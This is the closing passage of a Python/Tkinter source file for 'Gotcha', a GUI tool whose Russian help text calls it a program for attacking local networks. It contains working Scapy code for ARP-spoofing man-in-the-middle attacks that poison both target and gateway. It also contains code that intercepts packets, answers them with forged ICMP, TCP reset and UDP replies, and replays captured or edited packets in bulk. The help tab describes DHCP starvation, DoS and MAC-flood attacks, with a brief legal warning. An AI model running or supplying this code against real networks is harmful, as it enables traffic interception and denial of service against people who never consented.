        self.arp_spoof_log.pack(fill='both', expand=True, padx=5, pady=5)
        
        ttk.Button(log_frame, text="Сохранить логи", 
                  command=lambda: self.save_log(self.arp_spoof_log), width=14).pack(pady=5)

    def start_arp_spoof(self):
        self.arp_spoof_running = True
        self.arp_spoof_start_btn.config(state='disabled')
        self.arp_spoof_stop_btn.config(state='normal')
        
        try:
            interval = float(self.arp_spoof_interval.get())
        except:
            interval = 2.0
        
        self.arp_spoof_stats = {
            'start_time': time.time(),
            'sent_packets': 0,
            'last_update': time.time(),
            'last_sent': 0
        }
        
        self.arp_spoof_thread = threading.Thread(
            target=self.arp_spoof_worker,
            args=(self.arp_target_ip.get(), self.arp_gateway_ip.get(), 
                  self.arp_spoof_interface.get(), interval)
        )
        self.arp_spoof_thread.daemon = True
        self.arp_spoof_thread.start()
        
        self.update_arp_spoof_stats()
        
        self.arp_spoof_log.insert('end', f"Запущен ARP Spoofing (интервал: {interval} сек)\n")
        self.status_var.set("ARP Spoofing запущен")
    
    def stop_arp_spoof(self):
        self.arp_spoof_running = False
        self.arp_spoof_start_btn.config(state='normal')
        self.arp_spoof_stop_btn.config(state='disabled')
        
        if self.arp_spoof_thread and self.arp_spoof_thread.is_alive():
            self.arp_spoof_thread.join(timeout=1.0)
        
        total_time = time.time() - self.arp_spoof_stats['start_time']
        total_packets = self.arp_spoof_stats['sent_packets']
        
        self.arp_spoof_log.insert('end', "ARP Spoofing остановлен\n")
        self.arp_spoof_log.insert('end', f"Итоговая статистика:\n")
        self.arp_spoof_log.insert('end', f"  • Всего пакетов: {total_packets}\n")
        self.arp_spoof_log.insert('end', f"  • Общее время: {total_time:.1f} сек\n")
        self.arp_spoof_log.insert('end', f"  • Средняя скорость: {int(total_packets/total_time) if total_time > 0 else 0} пак/сек\n")
        
        self.status_var.set("ARP Spoofing остановлен")
    
    def update_arp_spoof_stats(self):
        if not self.arp_spoof_running:
            return
            
        current_time = time.time()
        duration = current_time - self.arp_spoof_stats['start_time']
        time_diff = current_time - self.arp_spoof_stats['last_update']
        
        if time_diff >= 1:
            packets_sent = self.arp_spoof_stats['sent_packets'] - self.arp_spoof_stats.get('last_sent', 0)
            current_rate = packets_sent / time_diff if time_diff > 0 else 0
            
            self.arp_spoof_current_rate.config(text=f"{int(current_rate)} пак/сек")
            self.arp_spoof_stats['last_update'] = current_time
            self.arp_spoof_stats['last_sent'] = self.arp_spoof_stats['sent_packets']
        
        self.arp_spoof_sent.config(text=str(self.arp_spoof_stats['sent_packets']))
        
        hours = int(duration // 3600)
        minutes = int((duration % 3600) // 60)
        seconds = int(duration % 60)
        self.arp_spoof_duration.config(text=f"{hours:02d}:{minutes:02d}:{seconds:02d}")
        
        if self.arp_spoof_running:
            self.root.after(1000, self.update_arp_spoof_stats)
    
    def arp_spoof_worker(self, target_ip, gateway_ip, interface, interval):
        try:
            packet_count = 0
            
            attacker_mac = get_if_hwaddr(interface)
            
            self.arp_spoof_log.insert('end', f"Начало ARP Spoofing атаки\n")
            self.arp_spoof_log.insert('end', f"Цель: {target_ip}, Шлюз: {gateway_ip}\n")
            self.arp_spoof_log.insert('end', f"MAC атакующего: {attacker_mac}\n")
            
            while self.arp_spoof_running:
                arp_to_target = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(
                    op=2,
                    psrc=gateway_ip,
                    hwsrc=attacker_mac,
                    pdst=target_ip,
                    hwdst="ff:ff:ff:ff:ff:ff"
                )
                
                arp_to_gateway = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(
                    op=2,
                    psrc=target_ip,
                    hwsrc=attacker_mac,
                    pdst=gateway_ip,
                    hwdst="ff:ff:ff:ff:ff:ff"
                )
                
                sendp(arp_to_target, iface=interface, verbose=0)
                sendp(arp_to_gateway, iface=interface, verbose=0)
                
                packet_count += 2
                self.arp_spoof_stats['sent_packets'] = packet_count
                
                if packet_count % 10 == 0:
                    self.arp_spoof_log.insert('end', f"Отправлено {packet_count} ARP Spoofing пакетов\n")
                    self.arp_spoof_log.see('end')
                    self.status_var.set(f"ARP Spoofing: {packet_count} пакетов")
                
                sleep_time = interval
                interval_step = 0.1
                while sleep_time > 0 and self.arp_spoof_running:
                    time.sleep(min(interval_step, sleep_time))
                    sleep_time -= interval_step
                        
        except Exception as e:
            self.arp_spoof_log.insert('end', f"Ошибка ARP Spoofing: {str(e)}\n")

    def setup_intercept_tab(self, parent):
        main_frame = ttk.Frame(parent)
        main_frame.pack(fill='both', expand=True, padx=8, pady=8)
        
        left_frame = ttk.Frame(main_frame)
        left_frame.pack(side='left', fill='both', expand=True, padx=5, pady=5)
        
        right_frame = ttk.Frame(main_frame)
        right_frame.pack(side='right', fill='y', padx=5, pady=5)
        
        params_frame = ttk.LabelFrame(left_frame, text="Параметры перехвата пакетов")
        params_frame.pack(fill='x', padx=5, pady=5)
        
        row1 = ttk.Frame(params_frame)
        row1.pack(fill='x', padx=4, pady=3)
        
        ttk.Label(row1, text="Интерфейс:").pack(side='left', padx=2)
        self.intercept_interface = ttk.Combobox(row1, width=15, font=('Arial', 9), values=self.network_interfaces)
        self.intercept_interface.pack(side='left', padx=2)
        self.intercept_interface.set(self.network_interfaces[0] if self.network_interfaces else "Ethernet")
        
        ttk.Label(row1, text="Фильтр:").pack(side='left', padx=8)
        self.intercept_filter = ttk.Combobox(row1, width=18, font=('Arial', 9), values=[
            "icmp or tcp", "tcp", "udp", "icmp", "arp", "not arp", "not stp", 
            "port 80", "port 443", "host 192.168.1.1", "tcp port 80", "udp port 53"
        ])
        self.intercept_filter.pack(side='left', padx=2)
        self.intercept_filter.set("not (arp or stp or cdp)")
        
        row2 = ttk.Frame(params_frame)
        row2.pack(fill='x', padx=4, pady=3)
        
        ttk.Label(row2, text="Кол-во ответов:").pack(side='left', padx=2)
        self.intercept_response_count = ttk.Entry(row2, width=8, font=('Arial', 9))
        self.intercept_response_count.pack(side='left', padx=2)
        self.intercept_response_count.insert(0, "4")
        
        ttk.Label(row2, text="Кол-во для отпр.:").pack(side='left', padx=10)
        self.send_count = ttk.Entry(row2, width=8, font=('Arial', 9))
        self.send_count.pack(side='left', padx=2)
        self.send_count.insert(0, "100")
        
        button_frame = ttk.Frame(params_frame)
        button_frame.pack(fill='x', padx=4, pady=6)
        
        self.intercept_start_btn = ttk.Button(button_frame, text="Начать перехват", 
                                        command=self.start_packet_intercept, width=14)
        self.intercept_start_btn.pack(side='left', padx=2)
        
        self.intercept_stop_btn = ttk.Button(button_frame, text="Остановить", 
                                       command=self.stop_packet_intercept, width=12, state='disabled')
        self.intercept_stop_btn.pack(side='left', padx=2)
        
        ttk.Button(button_frame, text="Захватить выбранный", 
              command=self.capture_selected_intercept_packet, width=18).pack(side='left', padx=2)
        ttk.Button(button_frame, text="Редактировать выбранный", 
              command=self.edit_selected_intercept_packet, width=13).pack(side='left', padx=2)
        
        packets_frame = ttk.LabelFrame(left_frame, text="Перехваченные пакеты")
        packets_frame.pack(fill='both', expand=True, padx=5, pady=5)
        
        columns = ("№", "Время", "Источник", "Назначение", "Протокол", "Длина", "Информация")
        self.intercept_tree = ttk.Treeview(packets_frame, columns=columns, show='headings', height=12)
        
        for col in columns:
            self.intercept_tree.heading(col, text=col)
            self.intercept_tree.column(col, width=90)
        
        self.intercept_tree.column("№", width=40)
        self.intercept_tree.column("Время", width=80)
        self.intercept_tree.column("Источник", width=120)
        self.intercept_tree.column("Назначение", width=120)
        self.intercept_tree.column("Протокол", width=70)
        self.intercept_tree.column("Длина", width=50)
        self.intercept_tree.column("Информация", width=150)
        
        tree_scroll = ttk.Scrollbar(packets_frame, orient="vertical", command=self.intercept_tree.yview)
        self.intercept_tree.configure(yscrollcommand=tree_scroll.set)
        
        self.intercept_tree.pack(side='left', fill='both', expand=True)
        tree_scroll.pack(side='right', fill='y')
        
        control_frame = ttk.LabelFrame(right_frame, text="Управление пакетами")
        control_frame.pack(fill='x', padx=5, pady=5)
        
        info_frame = ttk.LabelFrame(control_frame, text="Текущие пакеты")
        info_frame.pack(fill='x', padx=5, pady=5)
        
        ttk.Label(info_frame, text="Захваченный:").pack(anchor='w', pady=1)
        self.captured_packet_info = ttk.Label(info_frame, text="Нет", foreground="#adb5bd", wraplength=300)
        self.captured_packet_info.pack(anchor='w', pady=1, fill='x')
        
        ttk.Label(info_frame, text="Отредактированный:").pack(anchor='w', pady=1)
        self.edited_packet_info = ttk.Label(info_frame, text="Нет", foreground="#adb5bd", wraplength=300)
        self.edited_packet_info.pack(anchor='w', pady=1, fill='x')
        
        send_frame = ttk.Frame(control_frame)
        send_frame.pack(fill='x', padx=5, pady=8)
        
        ttk.Button(send_frame, text="Отправить захваченный", 
              command=self.send_captured_packet, width=20).pack(pady=2)
        ttk.Button(send_frame, text="Отправить отредактированный", 
              command=self.send_edited_packet, width=20).pack(pady=2)
        
        ttk.Button(control_frame, text="Очистить список", 
              command=self.clear_intercept_list, width=20).pack(pady=5)
        
        log_frame = ttk.LabelFrame(right_frame, text="Лог перехвата")
        log_frame.pack(fill='both', expand=True, padx=5, pady=5)
        
        self.intercept_log = scrolledtext.ScrolledText(log_frame, height=20, wrap=tk.WORD, font=('Consolas', 8))
        self.intercept_log.pack(fill='both', expand=True, padx=5, pady=5)
        
        ttk.Button(log_frame, text="Сохранить логи", 
              command=lambda: self.save_log(self.intercept_log), width=14).pack(pady=4)
        
        self.intercept_tree.bind('<<TreeviewSelect>>', self.on_intercept_packet_select)

    def on_intercept_packet_select(self, event):
        selection = self.intercept_tree.selection()
        if not selection:
            return
            
        item = selection[0]
        packet_info = self.intercept_tree.item(item, 'values')
        
        index = int(packet_info[0]) - 1
        if 0 <= index < len(self.intercept_packets):
            self.selected_packet = self.intercept_packets[index]
            
            self.intercept_log.insert('end', f"\n--- ВЫБРАН ПАКЕТ #{packet_info[0]} ---\n")
            self.intercept_log.insert('end', f"Время: {packet_info[1]}\n")
            self.intercept_log.insert('end', f"Источник: {packet_info[2]}\n")
            self.intercept_log.insert('end', f"Назначение: {packet_info[3]}\n")
            self.intercept_log.insert('end', f"Протокол: {packet_info[4]}\n")
            self.intercept_log.insert('end', f"Длина: {packet_info[5]} байт\n")
            self.intercept_log.insert('end', f"Информация: {packet_info[6]}\n")
            self.intercept_log.see('end')

    def capture_selected_intercept_packet(self):
        if not self.selected_packet:
            messagebox.showwarning("Предупреждение", "Сначала выберите пакет из списка")
            return
            
        self.captured_packet = self.selected_packet
        self.captured_packet_info.config(text=f"Захвачен: {self.selected_packet.summary()}")
        self.intercept_log.insert('end', f"\nПакет захвачен для дальнейшего использования: {self.selected_packet.summary()}\n")
        self.intercept_log.see('end')

    def edit_selected_intercept_packet(self):
        if not self.selected_packet:
            messagebox.showwarning("Предупреждение", "Сначала выберите пакет из списка")
            return
            
        def callback(edited_packet, save_packet):
            try:
                interface = self.intercept_interface.get()
                
                if save_packet:
                    self.edited_packet = edited_packet
                    self.edited_packet_info.config(text=f"Отредактирован: {edited_packet.summary()}")
                    self.intercept_log.insert('end', f"\nПакет сохранен: {edited_packet.summary()}\n")
                
                self.intercept_log.see('end')
            except Exception as e:
                messagebox.showerror("Ошибка", f"Не удалось отправить пакет: {str(e)}")
        
        Editor(self.root, self.selected_packet, callback)

    def send_captured_packet(self):
        if self.captured_packet is None:
            self.intercept_log.insert('end', "Нет захваченного пакета для отправки!\n")
            return
            
        try:
            count = int(self.send_count.get())
            interface = self.intercept_interface.get()
            
            for i in range(count):
                sendp(self.captured_packet, iface=interface, verbose=0)
                
            self.intercept_log.insert('end', f"Отправлено {count} копий захваченного пакета\n")
        except Exception as e:
            self.intercept_log.insert('end', f"Ошибка отправки захваченного пакета: {str(e)}\n")

    def send_edited_packet(self):
        if self.edited_packet is None:
            self.intercept_log.insert('end', "Нет отредактированного пакета для отправки!\n")
            return
            
        try:
            count = int(self.send_count.get())
            interface = self.intercept_interface.get()
            
            for i in range(count):
                sendp(self.edited_packet, iface=interface, verbose=0)
                
            self.intercept_log.insert('end', f"Отправлено {count} копий отредактированного пакета\n")
            self.intercept_log.see('end')
        except Exception as e:
            self.intercept_log.insert('end', f"Ошибка отправки отредактированного пакета: {str(e)}\n")

    def clear_intercept_list(self):
        for item in self.intercept_tree.get_children():
            self.intercept_tree.delete(item)
        self.intercept_packets.clear()
        self.intercept_log.insert('end', "\nСписок перехваченных пакетов очищен\n")
        self.intercept_log.see('end')

    def add_packet_to_intercept_tree(self, packet_data):
        packet_num, current_time, src, dst, protocol, length, info, packet = packet_data
        
        self.intercept_packets.append(packet)
        
        self.intercept_tree.insert("", "end", values=(packet_num, current_time, src, dst, protocol, length, info))
        
        if len(self.intercept_tree.get_children()) > 1000:
            self.intercept_tree.delete(self.intercept_tree.get_children()[0])
            self.intercept_packets.pop(0)

    def start_packet_intercept(self):
        self.packet_intercept_running = True
        self.intercept_start_btn.config(state='disabled')
        self.intercept_stop_btn.config(state='normal')
        
        self.intercept_thread = threading.Thread(
            target=self.intercept_worker,
            args=(self.intercept_filter.get(), self.intercept_interface.get())
        )
        self.intercept_thread.daemon = True
        self.intercept_thread.start()
        
        self.intercept_log.insert('end', "Запущен перехват пакетов с ответами\n")
        self.status_var.set("Перехват пакетов запущен")

    def stop_packet_intercept(self):
        self.packet_intercept_running = False
        self.intercept_start_btn.config(state='normal')
        self.intercept_stop_btn.config(state='disabled')
        self.intercept_log.insert('end', "Перехват пакетов остановлен\n")
        self.status_var.set("Перехват пакетов остановлен")

    def get_packet_info(self, packet):
        src = "Unknown"
        dst = "Unknown"
        protocol = "Unknown"
        length = len(packet)
        info = ""

        if packet.haslayer(Ether):
            src = packet[Ether].src
            dst = packet[Ether].dst
        
        if packet.haslayer(IP):
            src = packet[IP].src
            dst = packet[IP].dst
            protocol = "IP"
            
            if packet.haslayer(TCP):
                protocol = "TCP"
                info = f"Ports: {packet[TCP].sport}->{packet[TCP].dport} Flags: {packet[TCP].flags}"
            elif packet.haslayer(UDP):
                protocol = "UDP" 
                info = f"Ports: {packet[UDP].sport}->{packet[UDP].dport}"
            elif packet.haslayer(ICMP):
                protocol = "ICMP"
                info = f"Type: {packet[ICMP].type} Code: {packet[ICMP].code}"
        
        elif packet.haslayer(ARP):
            protocol = "ARP"
            info = f"Operation: {packet[ARP].op}"

        return (src, dst, protocol, length, info)

    def intercept_worker(self, filter_str, interface):
        def intercept_handler(packet):
            if not self.packet_intercept_running:
                return
                
            timestamp = time.strftime("%H:%M:%S")
            self.intercept_log.insert('end', f"[{timestamp}] Перехвачен пакет: {packet.summary()}\n")
            self.intercept_log.see('end')
            
            src, dst, protocol, length, info = self.get_packet_info(packet)
            packet_num = len(self.intercept_tree.get_children()) + 1
            packet_data = (packet_num, timestamp, src, dst, protocol, length, info, packet)
            self.root.after(0, self.add_packet_to_intercept_tree, packet_data)
            
            try:
                response_count = int(self.intercept_response_count.get())
            except:
                response_count = 4
                
            for i in range(response_count):
                response_packet = self.create_response_packet(packet)
                if response_packet:
                    try:
                        sendp(response_packet, iface=interface, verbose=0)
                        self.intercept_log.insert('end', f"  -> Отправлен ответный пакет {i+1}\n")
                        self.intercept_log.see('end')
                    except Exception as e:
                        self.intercept_log.insert('end', f"  -> Ошибка отправки: {str(e)}\n")
            
        try:
            sniff(filter=filter_str, iface=interface, prn=intercept_handler,
                  stop_filter=lambda x: not self.packet_intercept_running)
        except Exception as e:
            self.intercept_log.insert('end', f"Ошибка перехвата: {str(e)}\n")

    def create_response_packet(self, original_packet):
        try:
            if original_packet.haslayer(ICMP) and original_packet[ICMP].type == 8:
                return IP(src=original_packet[IP].dst, dst=original_packet[IP].src)/ICMP(type=0, id=original_packet[ICMP].id, seq=original_packet[ICMP].seq)
            
            elif original_packet.haslayer(TCP):
                return IP(src=original_packet[IP].dst, dst=original_packet[IP].src)/TCP(
                    sport=original_packet[TCP].dport, 
                    dport=original_packet[TCP].sport,
                    flags="RA",
                    seq=random.randint(1000, 9000),
                    ack=original_packet[TCP].seq + 1
                )
            
            elif original_packet.haslayer(UDP):
                return IP(src=original_packet[IP].dst, dst=original_packet[IP].src)/UDP(
                    sport=original_packet[UDP].dport,
                    dport=original_packet[UDP].sport
                )/b"Response"
                
        except Exception as e:
            self.intercept_log.insert('end', f"Ошибка создания ответного пакета: {str(e)}\n")
        
        return None

    def setup_settings_tab(self, parent):
        main_frame = ttk.Frame(parent)
        main_frame.pack(fill='both', expand=True, padx=8, pady=8)
        
        theme_frame = ttk.LabelFrame(main_frame, text="Настройки темы")
        theme_frame.pack(fill='x', padx=5, pady=5)
        
        ttk.Button(theme_frame, text="Светлая тема", 
                  command=lambda: self.theme_manager.apply_theme("light"), width=12).pack(side='left', padx=4, pady=4)
        ttk.Button(theme_frame, text="Темная тема", 
                  command=lambda: self.theme_manager.apply_theme("dark"), width=12).pack(side='left', padx=4, pady=4)
        
        help_frame = ttk.LabelFrame(main_frame, text="Справка и документация")
        help_frame.pack(fill='both', expand=True, padx=5, pady=5)
        
        ttk.Button(help_frame, text="Открыть полную справку", 
                  command=self.show_help, width=22).pack(padx=8, pady=8)

    def save_log(self, text_widget):
        filename = filedialog.asksaveasfilename(
            defaultextension=".txt",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
        )
        if filename:
            try:
                with open(filename, 'w', encoding='utf-8') as f:
                    f.write(text_widget.get(1.0, tk.END))
                self.status_var.set("Логи сохранены")
            except Exception as e:
                messagebox.showerror("Ошибка", f"Не удалось сохранить файл: {str(e)}")

    def show_help(self):
        help_window = tk.Toplevel(self.root)
        help_window.title("Справка - Network tool")
        help_window.geometry("800x700")
        help_window.resizable(True, True)
        help_window.transient(self.root)
        help_window.grab_set()
        
        help_notebook = ttk.Notebook(help_window)
        help_notebook.pack(fill='both', expand=True, padx=15, pady=15)
        
        general_frame = ttk.Frame(help_notebook)
        help_notebook.add(general_frame, text="Общая информация")
        
        general_text = """Gotcha

Программа для атаки локальных вычислительных сетей

https://github.com/hedromanie

ТРЕБОВАНИЯ:
• Права Администратора
• OC : Windows 10
• Процессор min/recommended : Хотя б не pentium 
• Оперативная память : 4 ГБ
• NPCAP/WINPCAP ( Утилита работающая с сетевыми адаптерами )
• Для просмотра сетевого трафика рекомендуется WireShark ( Или иные ПО )
Для работы на Windows 7 Рекомендуется установить :
• Установленные пакеты MICROSOFT VISUAL C++ REDISTRIBUTABLE FOR VISUAL STUDIO 2013,2015,2017 


⚠️ ПРЕДУПРЕЖДЕНИЕ:
Инструмент Open Source. Тестировать необходимо на локальных сетях без доступа в интернет
Не рекомендуется использовать на корпоративных или иных сетях над которыми у вас нет доступа или иного разрешения
Не санкционированные атаки могут привести к уголовной отвественности и поедете на нары чефир гонять."""
        
        general_text_widget = scrolledtext.ScrolledText(general_frame, wrap=tk.WORD, font=('Arial', 10))
        general_text_widget.pack(fill='both', expand=True, padx=10, pady=10)
        general_text_widget.insert('1.0', general_text)
        general_text_widget.config(state='disabled')
        
        bpf_frame = ttk.Frame(help_notebook)
        help_notebook.add(bpf_frame, text="BPF фильтры")
        
        bpf_text = """Bpf фильтры (Berkeley Packet Filter)

Примечание: Это примеры можно пробовать и другие вариации

ОСНОВНЫЕ ПРИМИТИВЫ:
    host 192.168.1.1     - трафик с/на указанный хост
    net 192.168.0.0/24   - трафик в указанной сети
    port 80              - трафик на порт 80
    portrange 1-1024     - трафик в диапазоне портов

ПРОТОКОЛЫ:
    ip, ip6, arp, tcp, udp, icmp, icmp6

НАПРАВЛЕНИЕ:
    src host 192.168.1.1 - трафик от указанного хоста
    dst host 192.168.1.1 - трафик к указанному хосту
    src port 80          - трафик с порта 80
    dst port 80          - трафик на порт 80

ЛОГИЧЕСКИЕ ОПЕРАТОРЫ:
    and, or, not

ПОПУЛЯРНЫЕ КОМБИНАЦИИ:
    'tcp port 80'                        - HTTP трафик
    'udp port 53'                        - DNS запросы
    'icmp'                               - ICMP пакеты (ping)
    'arp'                                - ARP пакеты
    'not arp'                            - все кроме ARP
    'host 192.168.1.100 and tcp port 80' - HTTP трафик с/на хост
    'src net 192.168.1.0/24'             - трафик из сети 192.168.1.0/24
    'tcp and (port 80 or port 443)'      - HTTP/HTTPS трафик
    'icmp or arp'                        - ICMP и ARP пакеты
    'not port 22 and not port 23'        - исключает SSH и Telnet
    'not (arp or stp or cdp)'            - исключает служебные протоколы"""
        
        bpf_text_widget = scrolledtext.ScrolledText(bpf_frame, wrap=tk.WORD, font=('Consolas', 9))
        bpf_text_widget.pack(fill='both', expand=True, padx=10, pady=10)
        bpf_text_widget.insert('1.0', bpf_text)
        bpf_text_widget.config(state='disabled')

        attacks_frame = ttk.Frame(help_notebook)
        help_notebook.add(attacks_frame, text="Описание атак")
        
        attacks_text = """ОПИСАНИЕ ФУНКЦИЙ И АТАК:

ВСПОМОГАТЕЛЬНЫЕ ИНСТРУМЕНТЫ:
• ICMP Ping - проверка доступности узла
• Port Scan - сканирование распространенных портов
• Traceroute - определение маршрута следования пакетов
• Таблица маршрутизации - просмотр таблицы маршрутизации IPv4/IPv6
• Сетевые адаптеры - просмотр всех сетевых интерфейсов

Таблица маршрутизации - это набор правил, используемых для определения пути,
по которому пакет данных должен быть отправлен через сеть. Каждая запись содержит:
1. Сетевой адрес назначения
2. Маску подсети
3. Шлюз (gateway) - следующий узел на пути к цели
4. Интерфейс - сетевой адаптер для отправки
5. Метрика - стоимость маршрута (чем меньше, тем предпочтительнее)

АТАКИ:
1. ПЕРЕХВАТ ПАКЕТОВ С ОТВЕТАМИ
   - Перехватывает входящие пакеты
   - Отправляет несколько ответных пакетов
   - Настраиваемое количество ответов
   - Возможность захвата и отправки конкретным пакетом
   - Выбор и редактирование пакетов
   - Отправка отредактированного пакета

2. DHCP STARVATION ATTACK
   - Отправка DHCP Discover с уникальными случайными MAC
   - Занимает весь пул IP-адресов на DHCP сервере
   - Предотвращает получение IP легитимными клиентами
   - Настраиваемый размер пула ( В зависимости от маски и прочих условий )

3. ВЫСОКОПРОИЗВОДИТЕЛЬНАЯ DOS АТАКА
   - Поддержка протоколов: TCP, UDP, ICMP, ARP, DNS
   - Автоматическая многопоточность (использует все ядра CPU)
   - Высокая производительность (1000+ пакетов в секунду)
   - Непрерывный и ограниченный режимы работы
   - Статистика в реальном времени

4. MAC FLOOD ATTACK
   - Переполнение таблицы MAC-адресов коммутатора ( 16к Адрессов за 16 секунд )
   - Случайные MAC-адреса
   - Позволяет прослушивать весь сетевой трафик

5. ARP SPOOFING
   - Мани-ин-миддл атака через ARP poisoning
   - Обманывает целевые хосты, подменяя MAC адреса
   - Позволяет перехватывать трафик между узлами сети"""
        
        attacks_text_widget = scrolledtext.ScrolledText(attacks_frame, wrap=tk.WORD, font=('Arial', 10))
        attacks_text_widget.pack(fill='both', expand=True, padx=10, pady=10)
        attacks_text_widget.insert('1.0', attacks_text)
        attacks_text_widget.config(state='disabled')

        close_btn = ttk.Button(help_window, text="Закрыть", command=help_window.destroy)
        close_btn.pack(pady=10)

        self.theme_manager.apply_to_widgets(help_window, 
                                          self.theme_manager.themes[self.theme_manager.current_theme])

def main():
    root = tk.Tk()
    app = Gotcha(root)
    root.mainloop()

if __name__ == "__main__":
    main()